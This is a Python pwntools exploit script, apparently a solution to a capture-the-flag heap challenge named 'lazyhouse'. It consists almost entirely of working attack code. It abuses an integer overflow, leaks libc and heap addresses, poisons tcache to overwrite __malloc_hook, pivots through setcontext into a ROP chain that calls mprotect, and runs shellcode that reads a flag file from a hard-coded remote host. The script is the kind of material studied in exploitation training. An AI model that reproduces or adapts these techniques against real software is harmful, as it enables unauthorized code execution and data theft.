from pwn import *

context.arch = 'amd64'

###Util
def create(idx,size,data):
    r.sendlineafter('choice: ','1')
    r.sendlineafter('Index:',str(idx))
    r.sendlineafter('Size:',str(size))
    r.sendafter('House:',data)

def create_fail(idx,size):
    r.sendlineafter('choice: ','1')
    r.sendlineafter('Index:',str(idx))
    r.sendlineafter('Size:',str(size))

def show(idx):
    r.sendlineafter('choice: ','2')
    r.sendlineafter('Index:',str(idx))
    return r.recvuntil('$$$$$$$$',drop=True)

def delete(idx):
    r.sendlineafter('choice: ','3')
    r.sendlineafter('Index:',str(idx))

def edit(idx,data):
    r.sendlineafter('choice: ','4')
    r.sendlineafter('Index:',str(idx))
    r.sendafter('House:',data)

def create_special(data):
    r.sendlineafter('choice: ','5')
    r.sendafter('House:',data)

def replenish_money(idx):
    create_fail(idx,((1<<64)//0xda)+1)
    delete(idx)

###Addr
main_arena_offset = 0x1e4c40
unsorted_bin_offset = main_arena_offset+0x60
large_bin_offset = main_arena_offset+0x450
malloc_hook_offset = 0x1e4c30

###ROPgadget
L_pop_rax = 0x47cf8
L_pop_rdi = 0x26542
L_pop_rsi = 0x26f9e
L_pop_rdx = 0x12bda6
L_syscall = 0xcf6c5
L_nop = 0x3148f
L_setcontext = 0x55e35
'''
The setcontext function acts pretty much like calling sigreturn, but involves no syscall, and helps set all registers
0x55e35
   mov    rsp,QWORD PTR [rdx+0xa0]
   mov    rbx,QWORD PTR [rdx+0x80]
   mov    rbp,QWORD PTR [rdx+0x78]
   mov    r12,QWORD PTR [rdx+0x48]
   mov    r13,QWORD PTR [rdx+0x50]
   mov    r14,QWORD PTR [rdx+0x58]
   mov    r15,QWORD PTR [rdx+0x60]
   mov    rcx,QWORD PTR [rdx+0xa8]
   push   rcx
   mov    rsi,QWORD PTR [rdx+0x70]
   mov    rdi,QWORD PTR [rdx+0x68]
   mov    rcx,QWORD PTR [rdx+0x98]
   mov    r8,QWORD PTR [rdx+0x28]
   mov    r9,QWORD PTR [rdx+0x30]
   mov    rdx,QWORD PTR [rdx+0x88]
   xor    eax,eax
   ret
'''
L_call_rel_rbp = 0x10f9b5
'''
0x10f9b5
    mov    rax,QWORD PTR [rbp-0xf8]
    lea    rcx,[rbp-0x108]
    mov    rsi,QWORD PTR [rbp-0x140]
    mov    rdi,QWORD PTR [rbp-0x118]
    mov    edx,DWORD PTR [rax+0x18]
    call   QWORD PTR [rbp-0xf0]
'''
L_mov_rdx_rax_call = 0x127018
'''
0x127018
    mov    rdx,rax
    call   QWORD PTR [rbp+0x28]
'''


###Exploit
r = remote('3.115.121.123',5731)
replenish_money(0)

create(0,0x88,'M30W')
create(1,0x418,'M30W')
create(2,0x88,'M30W')
delete(1)

create(1,0x428,'M30W')
delete(1)
###Calloc  won't clear mmaped chunk
edit(0,b'\x00'*0x88+p64(0x423))
create(1,0x418,'a'*8)
leaks = show(1)
large_bin_addr = u64(leaks[8:16])
libc_base = large_bin_addr-large_bin_offset
print(hex(libc_base))
heap_addr = u64(leaks[16:24])-0x2e0
print(hex(heap_addr))

delete(2)
delete(0)
create(0,0x418,'M30W')
create(2,0x88,'M30W')
delete(2)
create(2,0x448,'M30W')

for i in range(5):
    create(3,0x218,'M30W')
    delete(3)

delete(0)
create(0,0x1f8,'M30W')
delete(2)
create(2,0x228,'M30W')

indirect_call_param = (p64(heap_addr+0x1d40)+p64(libc_base+L_mov_rdx_rax_call)).ljust(0x120,b'\x00')+p64(libc_base+L_setcontext)
fake_register_frame = b'\x00'*0xa0+p64(heap_addr+0x1e40)+p64(libc_base+L_nop)
ROPchain = p64(libc_base+L_pop_rdi)+p64(heap_addr)+\
           p64(libc_base+L_pop_rsi)+p64(0x21000)+\
           p64(libc_base+L_pop_rdx)+p64(7)+\
           p64(libc_base+L_pop_rax)+p64(10)+\
           p64(libc_base+L_syscall)+\
           p64(heap_addr+0x1ec0)
#argument = b'/proc/self/maps'.ljust(0x30,b'\x00')
argument = b'/home/lazyhouse/flag'.ljust(0x30,b'\x00')
shellcode = asm(f'''
                mov rdi, {heap_addr+0x1e90}
                mov rsi, 0
                mov rdx, 0
                mov rax, 2
                syscall
                mov rdi, 3
                mov rsi, {heap_addr}
                mov rdx, 0x200
                mov rax, 0
                syscall
                mov rdi, 1
                mov rsi, {heap_addr}
                mov rdx, 0x200
                mov rax, 1
                syscall
                hlt
                ''')
payload = indirect_call_param.ljust(0x200,b'\x00')+fake_register_frame.ljust(0x100,b'\x00')+ROPchain+argument+shellcode
create(3,0x400,payload)

edit(2,b'\x00'*0x228+p64(0x221)+p64(heap_addr+0x990)+p64(libc_base+malloc_hook_offset-0x200-0x10)) 
create(4,0x218,'M30W')
create_special(b'a'*0x200+p64(libc_base+L_call_rel_rbp))
create_fail(5,heap_addr+0x1b40+0xf8)

r.interactive()
